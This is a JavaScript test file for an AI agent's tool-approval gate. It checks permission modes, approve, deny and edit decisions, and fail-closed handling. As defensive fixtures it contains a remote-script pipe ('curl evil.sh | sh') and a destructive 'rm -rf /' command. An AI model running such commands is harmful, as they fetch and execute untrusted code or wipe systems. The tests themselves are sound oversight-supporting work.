/**
 * approvalGate.js —— pause/resume 原语测试。
 *
 * 约定:
 *   - APP_DATA_DIR 必须在任何 await import(server 模块) 之前设置,绝不写真实 server-data/
 *   - 每个用例用不同 email 走 issueTestSession,避免用户串扰
 *   - 决策一律通过 releaseApproval() 主动唤醒,不依赖 5s 轮询、不依赖 24h 超时
 */
import assert from 'node:assert/strict'
import fs from 'node:fs'
import os from 'node:os'
import path from 'node:path'
import test from 'node:test'

const TMP_DIR = fs.mkdtempSync(path.join(os.tmpdir(), 'yma-approval-gate-'))
process.env.APP_DATA_DIR = TMP_DIR

const {
  requestApproval,
  revalidateToolPermission,
  resumePersistedApproval,
  waitForDecision,
  releaseApproval,
  releaseApprovalsForJob,
  formatDeniedToolResult,
  _resetWaiters,
} = await import('../server/services/approvalGate.js')
const {
  createPendingApproval,
  decideApproval,
  listPendingApprovals,
  countPendingApprovals,
} = await import('../server/services/approvalStore.js')
const { listNotifications } = await import('../server/services/notificationsStore.js')
const { getApprovalSettings, rememberTool, setApprovalMode, setRiskOverride } = await import('../server/services/approvalSettingsStore.js')
const { createJob } = await import('../server/services/jobStore.js')
const { closeDb } = await import('../server/db.js')
const { issueTestSession } = await import('./helpers/testAuth.js')
const { registerDynamicTool } = await import('../server/utils/toolSchemaCatalog.js')

const POLL = 20

/**
 * 每个用例一个独立用户 + 一个真实 job 行(pending_approvals.job_id 有 FK 到 jobs)。
 */
function newUser(tag, { permissionMode = 'normal' } = {}) {
  const session = issueTestSession({ email: `approval-gate-${tag}-${process.pid}@example.com` })
  const jobId = `job-${tag}-${process.pid}`
  createJob({ id: jobId, userId: session.userId, title: `approval ${tag}`, prompt: 'test' })
  if (permissionMode) setApprovalMode({ userId: session.userId, mode: permissionMode })
  return { ...session, jobId }
}

/** 轮询等待 pending 行出现(requestApproval 是异步挂起的)。 */
async function waitForPendingRow(userId, { tries = 200 } = {}) {
  for (let i = 0; i < tries; i += 1) {
    const rows = listPendingApprovals({ userId, status: 'pending' })
    if (rows.length > 0) return rows[0]
    await new Promise((r) => setTimeout(r, 10))
  }
  throw new Error('等待 pending_approvals 行超时')
}

function expectedContextFor(approval) {
  return {
    userId: approval.userId,
    origin: approval.origin,
    jobId: approval.jobId,
    stepId: approval.stepId,
    sessionId: approval.sessionId,
    toolName: approval.toolName,
    policyProvenance: approval.policyProvenance,
  }
}

test.beforeEach(() => {
  _resetWaiters()
})

test.after(() => {
  _resetWaiters()
  closeDb()
  fs.rmSync(TMP_DIR, { recursive: true, force: true })
})

test('NEVER_APPROVE 工具(read_file)立即放行且不建行', async () => {
  const { userId, jobId } = newUser('never')
  const args = { path: 'src/index.js' }
  const result = await requestApproval({
    userId, origin: 'job', jobId, toolName: 'read_file', args, mode: 'all',
  })
  assert.equal(result.proceed, true)
  assert.deepEqual(result.args, args)
  assert.equal(countPendingApprovals({ userId }), 0)
})

test("chat mode 'all' 自动放行只读 bash_exec 且不建审批行", async () => {
  const { userId } = newUser('readonly-shell-chat')
  const args = { command: 'git status' }
  const result = await requestApproval({
    userId,
    origin: 'chat',
    sessionId: 'session-readonly-shell',
    toolName: 'bash_exec',
    args,
    mode: 'all',
  })

  assert.equal(result.proceed, true)
  assert.deepEqual(result.args, args)
  assert.equal(countPendingApprovals({ userId }), 0)
})

test('新用户默认使用 normal，命令和文件写入批准后才继续', async () => {
  const { userId, jobId } = newUser('default-normal', { permissionMode: null })
  assert.equal(getApprovalSettings({ userId }).mode, 'normal')
  for (const [toolName, args] of [
    ['bash_exec', { command: 'npm test' }],
    ['write_file', { path: 'default.txt', content: 'ok' }],
  ]) {
    const pending = requestApproval({ userId, origin: 'job', jobId, toolName, args, mode: 'unattended' })
    const row = await waitForPendingRow(userId)
    assert.equal(row.toolName, toolName)
    decideApproval({ userId, id: row.id, decision: 'approve' })
    releaseApproval(row.id)
    const result = await pending
    assert.equal(result.proceed, true)
    assert.deepEqual(result.args, args)
  }
  assert.equal(countPendingApprovals({ userId }), 0)
})

test('run_code remains a one-time decision in bypass mode', async () => {
  const { userId, jobId } = newUser('run-code-bypass', { permissionMode: 'bypass' })
  setRiskOverride({ userId, toolName: 'run_code', riskClass: 'read' })
  const args = { code: 'return 42', description: 'Calculate an answer' }
  const pending = requestApproval({
    userId,
    origin: 'job',
    jobId,
    toolName: 'run_code',
    args,
    mode: 'unattended',
  })

  const row = await waitForPendingRow(userId)
  assert.equal(row.toolName, 'run_code')
  assert.equal(row.risk, 'high')
  decideApproval({ userId, id: row.id, decision: 'approve' })
  releaseApproval(row.id)

  const result = await pending
  assert.equal(result.proceed, true)
  assert.deepEqual(result.args, args)
  assert.equal(countPendingApprovals({ userId }), 0)
})

test('standing rule 直通时返回命中的目标作用域用于审计', async () => {
  const { userId, jobId } = newUser('standing-audit')
  rememberTool({ userId, toolName: 'publish_report', args: { channelId: 'C-ops', text: 'first' } })
  const result = await requestApproval({
    userId, origin: 'job', jobId, toolName: 'publish_report', args: { channelId: 'C-ops', text: 'later' }, mode: 'all',
  })
  assert.equal(result.proceed, true)
  assert.deepEqual(result.authorization, {
    kind: 'standing_rule', toolName: 'publish_report', scope: 'target:channelId=C-ops',
  })
  assert.equal(countPendingApprovals({ userId }), 0)
})

test('per-user read risk override 仅对所属用户免审并返回审计来源', async () => {
  const owner = newUser('risk-owner')
  const stranger = newUser('risk-stranger')
  setRiskOverride({ userId: owner.userId, toolName: 'bash_exec', riskClass: 'read' })
  const allowed = await requestApproval({
    userId: owner.userId, origin: 'job', jobId: owner.jobId,
    toolName: 'bash_exec', args: { command: 'npm test' }, mode: 'all',
  })
  assert.equal(allowed.proceed, true)
  assert.deepEqual(allowed.authorization, {
    kind: 'risk_override', toolName: 'bash_exec', riskClass: 'read',
  })

  const controller = new AbortController()
  const pending = requestApproval({
    userId: stranger.userId, origin: 'job', jobId: stranger.jobId,
    toolName: 'bash_exec', args: { command: 'npm test' }, mode: 'all', signal: controller.signal,
  })
  await waitForPendingRow(stranger.userId)
  controller.abort()
  assert.equal((await pending).proceed, false)
})

test('缺失或空 userId 在分类和 hook 预授权入口均 fail closed', async () => {
  const args = { command: 'rm -rf /' }
  for (const uid of [null, undefined, '', '   ']) {
    for (const request of [
      { toolName: 'read_file', args: { path: 'safe.txt' } },
      { toolName: 'bash_exec', args, preAuthorized: true },
    ]) {
      const result = await requestApproval({
        userId: uid,
        origin: 'job',
        mode: 'all',
        ...request,
      })
      assert.equal(result.proceed, false)
      assert.equal(result.code, 'approval_user_identity_missing')
      assert.equal(result.identityFailure, true)
      assert.equal(result.systemFailure, true)
      assert.equal(result.retryable, false)
    }
  }
})

test('缺失或空 userId 在最终执行授权重验入口 fail closed', () => {
  for (const userId of [null, undefined, '', '   ']) {
    const result = revalidateToolPermission({
      userId,
      origin: 'job',
      toolName: 'read_file',
      args: { path: 'safe.txt' },
      allowAsk: true,
    })
    assert.equal(result.proceed, false)
    assert.equal(result.code, 'approval_user_identity_missing')
    assert.equal(result.identityFailure, true)
    assert.equal(result.retryable, false)
  }
})

test("mode 'off' 对危险调用 fail closed,不创建审批行", async () => {
  const { userId, jobId } = newUser('off')
  const result = await requestApproval({
    userId, origin: 'job', jobId, toolName: 'bash_exec', args: { command: 'rm -rf build' }, mode: 'off',
  })
  assert.equal(result.proceed, false)
  assert.match(result.reason, /审批队列已关闭/)
  assert.equal(countPendingApprovals({ userId }), 0)
})

test('Hook can force a normally safe tool through the durable approval inbox', async () => {
  const { userId, jobId } = newUser('hook-force')
  setApprovalMode({ userId, mode: 'normal' })
  const args = { path: 'src/index.js' }
  const pending = requestApproval({
    userId,
    origin: 'job',
    jobId,
    toolName: 'read_file',
    args,
    mode: 'all',
    forceApproval: true,
    forceApprovalReason: 'workspace policy review',
  })

  const row = await waitForPendingRow(userId)
  assert.equal(row.toolName, 'read_file')
  assert.equal(row.risk, 'low')
  assert.equal(row.reason, 'workspace policy review')
  decideApproval({ userId, id: row.id, decision: 'approve' })
  releaseApproval(row.id)

  const result = await pending
  assert.equal(result.proceed, true)
  assert.deepEqual(result.args, args)
})

test('Hook force approval does not elevate a write call out of plan mode', async () => {
  const { userId, jobId } = newUser('hook-force-plan')
  setApprovalMode({ userId, mode: 'plan' })
  const result = await requestApproval({
    userId,
    origin: 'job',
    jobId,
    toolName: 'write_file',
    args: { path: 'blocked.txt', content: 'x' },
    mode: 'all',
    forceApproval: true,
  })

  assert.equal(result.proceed, false)
  assert.match(result.reason, /计划模式/)
  assert.equal(countPendingApprovals({ userId }), 0)
})

test('Hook pre-authorization cannot bypass plan mode', async () => {
  const { userId, jobId } = newUser('hook-allow-plan')
  setApprovalMode({ userId, mode: 'plan' })
  const result = await requestApproval({
    userId,
    origin: 'chat',
    jobId,
    toolName: 'write_file',
    args: { path: 'blocked-by-plan.txt', content: 'x' },
    mode: 'all',
    preAuthorized: true,
  })

  assert.equal(result.proceed, false)
  assert.match(result.reason, /计划模式/)
  assert.equal(result.policyDenied, true)
  assert.equal(result.permissionMode, 'plan')
  assert.equal(result.suggestedPermissionMode, 'acceptEdits')
  const formatted = formatDeniedToolResult(result)
  assert.equal(formatted.policyDenied, true)
  assert.equal(formatted.deniedByUser, undefined)
  assert.match(formatted.error, /工具存在/)
  assert.match(formatted.error, /自动接受编辑模式/)
  assert.doesNotMatch(formatted.error, /缺少写入或执行工具[^。]*$/)
  assert.equal(countPendingApprovals({ userId }), 0)
})

test('runtime plugin does not inherit name-only standing grants or risk overrides', async () => {
  const { userId, jobId } = newUser('plugin-policy-isolation')
  const toolName = 'plugin_publish_report'
  const args = { channelId: 'C-ops', text: 'plugin payload' }
  rememberTool({ userId, toolName, args })
  setRiskOverride({ userId, toolName, riskClass: 'read' })
  const dispose = registerDynamicTool({
    name: toolName,
    origin: 'plugin',
    source: 'plugin-policy-owner',
    spec: {
      type: 'function',
      function: {
        name: toolName,
        description: 'Plugin policy isolation probe',
        parameters: { type: 'object', properties: {}, additionalProperties: true },
      },
    },
    metadata: {
      riskClass: 'external',
      requiresApproval: true,
      isReadOnly: false,
      source: 'fallback',
    },
    exec: async () => ({ ok: true }),
  })
  const controller = new AbortController()
  try {
    const pending = requestApproval({
      userId,
      origin: 'job',
      jobId,
      toolName,
      args,
      mode: 'all',
      signal: controller.signal,
    })
    const row = await waitForPendingRow(userId)
    assert.equal(row.toolName, toolName)
    controller.abort()
    const result = await pending
    assert.equal(result.proceed, false)
    assert.equal(result.cancelled, true)
  } finally {
    controller.abort()
    dispose()
  }
})

test('switching to plan invalidates a mutating approval before a live waiter consumes it', async () => {
  const { userId, jobId } = newUser('live-plan-revalidation')
  const pending = requestApproval({
    userId,
    origin: 'job',
    jobId,
    toolName: 'write_file',
    args: { path: 'must-not-write.txt', content: 'blocked' },
    mode: 'unattended',
  })
  const row = await waitForPendingRow(userId)

  setApprovalMode({ userId, mode: 'plan' })
  decideApproval({ userId, id: row.id, decision: 'approve' })
  releaseApproval(row.id)

  const result = await pending
  assert.equal(result.proceed, false)
  assert.equal(result.policyDenied, true)
  assert.equal(result.permissionMode, 'plan')
  assert.match(result.reason, /计划模式/)
  assert.equal(countPendingApprovals({ userId }), 0)
})

test('restart recovery revalidates an approved mutation against the current plan mode', async () => {
  const { userId, jobId } = newUser('restart-plan-revalidation')
  const approval = createPendingApproval({
    userId,
    origin: 'job',
    jobId,
    toolName: 'write_file',
    args: { path: 'restart-must-not-write.txt', content: 'blocked' },
    risk: 'medium',
    reason: '修改本地数据',
  })
  decideApproval({ userId, id: approval.id, decision: 'approve' })
  setApprovalMode({ userId, mode: 'plan' })

  const result = await resumePersistedApproval({
    approvalId: approval.id,
    expectedApprovalContext: expectedContextFor(approval),
  })
  assert.equal(result.proceed, false)
  assert.equal(result.policyDenied, true)
  assert.equal(result.permissionMode, 'plan')
  assert.match(result.reason, /计划模式/)
})

test('legacy boolean Hook pre-authorization is rejected without provenance', async () => {
  const { userId, jobId } = newUser('hook-legacy-boolean')
  const result = await requestApproval({
    userId,
    origin: 'job',
    jobId,
    toolName: 'write_file',
    args: { path: 'legacy.txt', content: 'blocked' },
    mode: 'all',
    preAuthorized: true,
  })

  assert.equal(result.proceed, false)
  assert.equal(result.code, 'hook_authorization_provenance_missing')
  assert.equal(result.hookAuthorizationFailure, true)
  assert.equal(countPendingApprovals({ userId }), 0)
})

test('已批准的持久审批不能在缺失或空恢复身份时放行', async () => {
  const { userId, jobId } = newUser('restart-missing-identity')
  const approval = createPendingApproval({
    userId,
    origin: 'job',
    jobId,
    toolName: 'write_file',
    args: { path: 'must-not-resume.txt', content: 'blocked' },
    risk: 'medium',
    reason: '修改本地数据',
  })
  decideApproval({ userId, id: approval.id, decision: 'approve' })

  for (const invalidUserId of [null, undefined, '', '   ']) {
    const result = await resumePersistedApproval({
      approvalId: approval.id,
      expectedApprovalContext: {
        ...expectedContextFor(approval),
        userId: invalidUserId,
      },
    })
    assert.equal(result.proceed, false)
    assert.equal(result.code, 'approval_user_identity_missing')
    assert.equal(result.identityFailure, true)
    assert.equal(result.retryable, false)
    assert.equal(result.approvalId, approval.id)
  }
})

test('真实用户档位依次执行 plan / normal / acceptEdits / bypass 语义', async () => {
  const planUser = newUser('mode-plan')
  setApprovalMode({ userId: planUser.userId, mode: 'plan' })
  const planned = await requestApproval({
    ...planUser,
    origin: 'chat',
    toolName: 'write_file',
    args: { path: 'planned.txt', content: 'x' },
    mode: 'unattended',
  })
  assert.equal(planned.proceed, false)
  assert.match(planned.reason, /计划模式/)
  assert.equal(countPendingApprovals({ userId: planUser.userId }), 0)

  const normalUser = newUser('mode-normal')
  setApprovalMode({ userId: normalUser.userId, mode: 'normal' })
  const controller = new AbortController()
  const normalPending = requestApproval({
    ...normalUser,
    origin: 'chat',
    toolName: 'write_file',
    args: { path: 'normal.txt', content: 'x' },
    mode: 'unattended',
    signal: controller.signal,
  })
  await waitForPendingRow(normalUser.userId)
  controller.abort()
  assert.equal((await normalPending).proceed, false)

  const editsUser = newUser('mode-edits')
  setApprovalMode({ userId: editsUser.userId, mode: 'acceptEdits' })
  const edited = await requestApproval({
    ...editsUser,
    origin: 'chat',
    toolName: 'write_file',
    args: { path: 'accepted.txt', content: 'x' },
    mode: 'unattended',
  })
  assert.equal(edited.proceed, true)
  assert.equal(countPendingApprovals({ userId: editsUser.userId }), 0)

  const editsShellController = new AbortController()
  const editsShellPending = requestApproval({
    ...editsUser,
    origin: 'chat',
    toolName: 'bash_exec',
    args: { command: 'npm test' },
    mode: 'unattended',
    signal: editsShellController.signal,
  })
  await waitForPendingRow(editsUser.userId)
  editsShellController.abort()
  assert.equal((await editsShellPending).proceed, false)

  const bypassUser = newUser('mode-bypass')
  setApprovalMode({ userId: bypassUser.userId, mode: 'bypass' })
  const bypassed = await requestApproval({
    ...bypassUser,
    origin: 'job',
    toolName: 'bash_exec',
    args: { command: 'rm -rf build' },
    mode: 'off',
  })
  assert.equal(bypassed.proceed, true)
  assert.equal(countPendingApprovals({ userId: bypassUser.userId }), 0)

  const hookForced = await requestApproval({
    ...bypassUser,
    origin: 'chat',
    toolName: 'bash_exec',
    args: { command: 'npm run build' },
    mode: 'all',
    forceApproval: true,
    forceApprovalReason: 'pre_tool_use Hook 要求逐次批准',
  })
  assert.equal(hookForced.proceed, true)
  assert.equal(countPendingApprovals({ userId: bypassUser.userId }), 0)
})

test('run_project_check 通过真实门控执行四档权限语义', async () => {
  const args = { check: 'test' }

  const planUser = newUser('project-check-plan', { permissionMode: 'plan' })
  const planned = await requestApproval({
    ...planUser,
    origin: 'chat',
    toolName: 'run_project_check',
    args,
    mode: 'unattended',
  })
  assert.equal(planned.proceed, false)
  assert.match(planned.reason, /计划模式/)
  assert.equal(countPendingApprovals({ userId: planUser.userId }), 0)

  for (const permissionMode of ['normal', 'acceptEdits']) {
    const gatedUser = newUser(`project-check-${permissionMode}`, { permissionMode })
    const controller = new AbortController()
    const pending = requestApproval({
      ...gatedUser,
      origin: 'chat',
      toolName: 'run_project_check',
      args,
      mode: 'unattended',
      signal: controller.signal,
    })
    const row = await waitForPendingRow(gatedUser.userId)
    assert.equal(row.toolName, 'run_project_check')
    assert.equal(row.risk, 'high')
    controller.abort()
    assert.equal((await pending).proceed, false)
  }

  const bypassUser = newUser('project-check-bypass', { permissionMode: 'bypass' })
  const bypassed = await requestApproval({
    ...bypassUser,
    origin: 'chat',
    toolName: 'run_project_check',
    args,
    mode: 'off',
  })
  assert.equal(bypassed.proceed, true)
  assert.equal(countPendingApprovals({ userId: bypassUser.userId }), 0)
})

test('APPROVE:批准后返回原始 args', async () => {
  const { userId, jobId } = newUser('approve')
  const args = { command: 'npm run build' }
  const pending = requestApproval({
    userId, origin: 'job', jobId, stepId: 'step-1',
    toolName: 'bash_exec', args, mode: 'all',
  })

  const row = await waitForPendingRow(userId)
  assert.equal(row.toolName, 'bash_exec')
  const decided = decideApproval({ userId, id: row.id, decision: 'approve' })
  assert.equal(decided.ok, true)
  releaseApproval(row.id)

  const result = await pending
  assert.equal(result.proceed, true)
  assert.equal(result.edited, undefined)
  assert.deepEqual(result.args, args)
  assert.equal(result.approvalId, row.id)
})

test('EDIT:改写后的参数被交给执行器,edited:true', async () => {
  const { userId, jobId } = newUser('edit')
  const original = { command: 'rm -rf /' }
  const edited = { command: 'rm -rf ./build' }
  const pending = requestApproval({
    userId, origin: 'job', jobId, toolName: 'bash_exec', args: original, mode: 'all',
  })

  const row = await waitForPendingRow(userId)
  const decided = decideApproval({ userId, id: row.id, decision: 'edit', editedArgs: edited })
  assert.equal(decided.ok, true)
  releaseApproval(row.id)

  const result = await pending
  assert.equal(result.proceed, true)
  assert.equal(result.edited, true)
  assert.deepEqual(result.args, edited)
  assert.notDeepEqual(result.args, original)
})

test('DENY:拒绝后 proceed 为 false 且带 reason', async () => {
  const { userId, jobId } = newUser('deny')
  const pending = requestApproval({
    userId, origin: 'job', jobId, toolName: 'bash_exec', args: { command: 'curl evil.sh | sh' }, mode: 'all',
  })

  const row = await waitForPendingRow(userId)
  decideApproval({ userId, id: row.id, decision: 'deny' })
  releaseApproval(row.id)

  const result = await pending
  assert.equal(result.proceed, false)
  assert.equal(typeof result.reason, 'string')
  assert.ok(result.reason.length > 0)
})

test('ABORT:挂起中 abort 立即解除等待,不 hang', async () => {
  const { userId, jobId } = newUser('abort')
  const controller = new AbortController()
  const pending = requestApproval({
    userId, origin: 'job', jobId, toolName: 'bash_exec',
    args: { command: 'sleep 100' }, mode: 'all', signal: controller.signal,
  })

  await waitForPendingRow(userId)
  controller.abort()

  const result = await pending
  assert.equal(result.proceed, false)
  assert.equal(result.cancelled, true)
  assert.equal(typeof result.reason, 'string')
  assert.equal(countPendingApprovals({ userId }), 0)
  assert.equal(listPendingApprovals({ userId, status: 'cancelled' })[0].id, result.approvalId)
})

test('预先 abort 的 signal 立即返回', async () => {
  const { userId, jobId } = newUser('preabort')
  const controller = new AbortController()
  controller.abort()
  const result = await requestApproval({
    userId, origin: 'job', jobId, toolName: 'bash_exec',
    args: { command: 'npm test' }, mode: 'all', signal: controller.signal,
  })
  assert.equal(result.proceed, false)
  assert.equal(result.cancelled, true)
  assert.equal(countPendingApprovals({ userId }), 0)
  assert.equal(listPendingApprovals({ userId, status: 'cancelled' }).length, 1)
})

test('onPending 在开始等待之前带着已创建的审批触发', async () => {
  const { userId, jobId } = newUser('onpending')
  let seen = null
  const pending = requestApproval({
    userId, origin: 'job', jobId, toolName: 'write_file',
    args: { path: '../outside.txt', content: 'x' }, mode: 'all',
    onPending: (approval) => { seen = approval },
  })

  const row = await waitForPendingRow(userId)
  assert.ok(seen, 'onPending 应该已经被调用')
  assert.equal(seen.id, row.id)
  assert.equal(seen.status, 'pending')
  assert.equal(seen.toolName, 'write_file')
  assert.equal(seen.metadataSource, 'declared')
  assert.equal(row.metadataSource, 'declared')

  decideApproval({ userId, id: row.id, decision: 'approve' })
  releaseApproval(row.id)
  await pending
})

test('unregistered tool approvals persist fallback as their metadata source', async () => {
  const { userId, jobId } = newUser('fallback-source')
  let seen = null
  const pending = requestApproval({
    userId,
    origin: 'job',
    jobId,
    toolName: 'unregistered_external_action',
    args: { target: 'example' },
    mode: 'all',
    onPending: (approval) => { seen = approval },
  })

  const row = await waitForPendingRow(userId)
  assert.equal(row.metadataSource, 'fallback')
  assert.equal(seen?.metadataSource, 'fallback')
  decideApproval({ userId, id: row.id, decision: 'deny' })
  releaseApproval(row.id)
  await pending
})

test('releaseApprovalsForJob 作废该 job 的挂起审批,等待者返回 proceed:false', async () => {
  const { userId, jobId } = newUser('cancel')
  const pending = requestApproval({
    userId, origin: 'job', jobId, toolName: 'bash_exec', args: { command: 'npm test' }, mode: 'all',
  })

  const row = await waitForPendingRow(userId)
  const changed = releaseApprovalsForJob(jobId)
  assert.equal(changed, 1)

  const result = await pending
  assert.equal(result.proceed, false)
  assert.equal(countPendingApprovals({ userId }), 0)
  assert.equal(listPendingApprovals({ userId, status: 'cancelled' })[0].id, row.id)
})

test('门控打开时为用户创建 kind=approval 的通知', async () => {
  const { userId, jobId } = newUser('notify')
  const pending = requestApproval({
    userId, origin: 'job', jobId, toolName: 'bash_exec', args: { command: 'npm test' }, mode: 'all',
  })

  const row = await waitForPendingRow(userId)
  const notes = listNotifications({ userId }).filter((n) => n.kind === 'approval')
  assert.equal(notes.length, 1)
  assert.ok(notes[0].title.includes('bash_exec'))
  assert.equal(notes[0].data?.approvalId, row.id)

  decideApproval({ userId, id: row.id, decision: 'approve' })
  releaseApproval(row.id)
  await pending
})

test('waitForDecision 直接调用:小 pollIntervalMs + releaseApproval 唤醒', async () => {
  const { userId, jobId } = newUser('waitdirect')
  const pending = requestApproval({
    userId, origin: 'job', jobId, toolName: 'bash_exec', args: { command: 'npm test' }, mode: 'all',
  })
  const row = await waitForPendingRow(userId)

  const secondWaiter = waitForDecision({
    approvalId: row.id,
    pollIntervalMs: POLL,
    expectedApprovalContext: expectedContextFor(row),
  })
  decideApproval({ userId, id: row.id, decision: 'approve' })
  releaseApproval(row.id)

  const [a, b] = await Promise.all([pending, secondWaiter])
  assert.equal(a.proceed, true)
  assert.equal(b.proceed, true)
})

// ─────────── 区分「用户拒绝」与「系统故障」 ───────────
// 以前两者返回一模一样的形状,模型只能看到一句拒绝 → 当成用户不同意 →
// 放弃任务、要求用户手动操作。实际上系统故障应该重试。

test('★ 系统故障标记为 retryable,且明确告诉模型这不是用户拒绝', () => {
  const out = formatDeniedToolResult({
    proceed: false,
    reason: '审批系统暂时不可用,已保守拒绝',
    systemFailure: true,
    retryable: true,
  })
  assert.equal(out.ok, false, '仍然不执行 —— 失败必须 fail closed')
  assert.equal(out.systemFailure, true)
  assert.equal(out.retryable, true)
  assert.equal(out.denied, false, '不是「被拒绝」,是没走成')
  assert.match(out.error, /不是用户拒绝/, '必须让模型看懂区别')
  assert.match(out.error, /重试/)
})

test('★ 用户拒绝不标 retryable,并提示模型换方案', () => {
  const out = formatDeniedToolResult({
    proceed: false,
    reason: '用户拒绝了这次调用',
    deniedByUser: true,
  })
  assert.equal(out.ok, false)
  assert.equal(out.denied, true)
  assert.equal(out.deniedByUser, true)
  assert.notEqual(out.retryable, true, '用户说不,重试是骚扰')
  assert.notEqual(out.systemFailure, true)
  assert.match(out.error, /换一个方案/)
})

test('计划模式拒绝返回稳定策略码且不伪装成工具缺失', () => {
  const out = formatDeniedToolResult({
    proceed: false,
    reason: '当前为计划模式',
    policyDenied: true,
    permissionMode: 'plan',
    suggestedPermissionMode: 'acceptEdits',
  })
  assert.equal(out.code, 'policy_denied_plan_mode')
  assert.equal(out.policyDenied, true)
  assert.match(out.error, /工具存在/)
  assert.doesNotMatch(out.error, /工具不存在|本轮不可用/)
})

test('缺少逐次审批返回稳定码且不伪装成用户拒绝', () => {
  const out = formatDeniedToolResult({
    proceed: false,
    reason: 'run_code 必须由用户逐次批准后才能执行',
    approvalRequired: true,
    permissionMode: 'normal',
  })

  assert.equal(out.ok, false)
  assert.equal(out.denied, false)
  assert.equal(out.code, 'approval_required')
  assert.equal(out.approvalRequired, true)
  assert.equal(out.retryable, true)
  assert.equal(out.deniedByUser, undefined)
  assert.match(out.error, /重新发起/)
  assert.match(out.error, /逐次审批/)
  assert.doesNotMatch(out.error, /换一个方案/)
})

test('超时与取消各有独立措辞,不与用户拒绝混淆', () => {
  const expired = formatDeniedToolResult({ proceed: false, reason: '审批超时未处理(视同拒绝)', expired: true })
  assert.equal(expired.expired, true)
  assert.notEqual(expired.retryable, true)
  assert.match(expired.error, /用户可能不在/)

  const cancelled = formatDeniedToolResult({ proceed: false, reason: '任务已取消,审批作废', cancelled: true })
  assert.equal(cancelled.cancelled, true)
  assert.notEqual(cancelled.systemFailure, true)
})

test('缺字段的 gate 结果不抛错,默认按用户拒绝处理', () => {
  for (const bad of [null, undefined, {}, { proceed: false }]) {
    let out
    assert.doesNotThrow(() => { out = formatDeniedToolResult(bad) })
    assert.equal(out.ok, false, '任何情况下都不能放行')
  }
})

test('★ 审批记录丢失算系统故障,不算用户拒绝', async () => {
  const { token, userId } = newUser('gate-missing')
  void token
  // 直接等一个不存在的审批 —— 记录丢失应被判为系统故障
  const decision = await waitForDecision({
    approvalId: 'does-not-exist',
    pollIntervalMs: 20,
    expectedApprovalContext: { userId },
  })
  assert.equal(decision.proceed, false)
  assert.equal(decision.systemFailure, true, '记录消失是基础设施问题')
  assert.equal(decision.retryable, true)
})
